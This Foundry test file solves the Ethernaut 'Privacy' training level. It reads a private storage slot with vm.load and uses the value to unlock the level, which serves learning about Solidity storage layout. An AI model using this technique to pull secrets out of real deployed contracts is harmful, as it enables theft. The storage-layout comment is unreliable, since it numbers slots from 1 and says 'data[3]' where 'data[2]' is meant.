// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/12-Privacy/PrivacyFactory.sol";
import "../core/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testPrivacyHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // The goal is to pass unlock state variable from Privacy contract to False
        // For that, it is needed to pass a bytes16 key that will verify _key == bytes16(data[2])
        // By looking at the Privacy contract storage, there is
        //
        // bool locked
        // uint256 ID
        // uint8 flattening
        // uint8 denomination
        // uint16 awkwardness
        // bytes32[3] data;
        //
        // data is private but it is possible to retrieve the information on the blockchain
        // By studying the layout of contract storage
        // each slot is 32 bytes and variable can be packed together
        // Here, it will be
        // slot 1 -> locked
        // slot 2 -> ID
        // slot 3 -> flattening & denomination & awkwardness
        // slot 4 -> data[0]
        // slot 5 -> data[1]
        // slot 6 -> data[3]
        //
        // Hence solution is at slot 5
        //
        // See https://docs.soliditylang.org/en/v0.8.19/internals/layout_in_storage.html

        bytes32 slot = bytes32(uint256(5));
        bytes32 loadedValue = vm.load(address(ethernautPrivacy), slot);

        ethernautPrivacy.unlock(bytes16(loadedValue));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
